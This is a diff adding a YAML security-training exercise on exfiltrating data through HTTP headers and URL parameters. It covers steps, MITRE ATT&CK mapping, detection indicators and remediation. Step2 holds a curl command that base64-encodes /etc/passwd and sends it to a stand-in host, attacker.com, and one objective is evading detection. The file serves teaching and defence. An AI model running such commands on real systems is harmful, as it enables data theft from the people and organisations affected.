@@ -1,0 +1,89 @@
+# Category: Data Exfiltration
+name: "HTTP/HTTPS Covert Channel – Using Headers and Parameters"
+id: "exfil-http-covert-001"
+category: "exfiltration"
+subcategory: "network_tunnels"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Use HTTP requests to exfiltrate data by embedding it in headers (User‑Agent,
+  Cookie) or URL parameters. This can blend in with normal web traffic and
+  bypass many detection mechanisms.
+
+learning_objectives:
+  - Understand HTTP headers and parameters that can carry data
+  - Craft requests to a controlled web server
+  - Use polling intervals to send chunks
+  - Avoid detection by mimicking real traffic
+
+tools:
+  - curl
+  - Python (requests)
+  - Burp Suite (to intercept)
+  - Web server logs
+
+prerequisites:
+  - A web server controlled by the attacker
+  - Outbound HTTP/HTTPS allowed
+
+steps:
+  - id: "step1"
+    phase: "server_setup"
+    action: "Set up web server to log all request details"
+    commands:
+      - "# Apache or Nginx with access logs"
+    expected_output: "Server ready to receive data"
+    detection: "Web logs show unusual headers"
+
+  - id: "step2"
+    phase: "client"
+    action: "Send data via HTTP headers"
+    commands:
+      - '# Sending file content chunk by chunk'
+      - 'curl -H "User-Agent: $(cat /etc/passwd | base64)" http://attacker.com/log'
+      - "# Or use URL parameter: ?data=..."
+    expected_output: "Data sent in headers"
+    detection: "Anomalous User-Agent strings"
+
+  - id: "step3"
+    phase: "reassembly"
+    action: "Reconstruct data from server logs"
+    expected_output: "Complete exfiltrated file"
+    detection: "N/A"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1048.002"
+    description: "Exfiltration Over Web Service"
+  - standard: "NIST SP 800-53"
+    control: "SI-4"
+
+detection:
+  network_indicators:
+    - "Requests with long User-Agent strings (base64-like)"
+    - "Requests to a suspicious domain"
+  log_indicators:
+    - "Web logs with unusual headers"
+  endpoint_indicators:
+    - "curl or Python scripts"
+
+remediation:
+  immediate:
+    - "Inspect outbound HTTP traffic for anomalies (e.g., unusual headers)"
+    - "Use whitelist of allowed domains"
+  long_term:
+    - "Implement data loss prevention (DLP) on web traffic"
+    - "Use TLS inspection to inspect encrypted traffic"
+
+variables:
+  attacker_domain: "attacker.com"
+
+assessment_questions:
+  - "What HTTP headers are commonly abused for data exfiltration?"
+  - "How can an attacker avoid detection in HTTP exfiltration?"
+  - "What is the role of DLP in preventing this?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1048/002/"
+    title: "MITRE T1048.002"
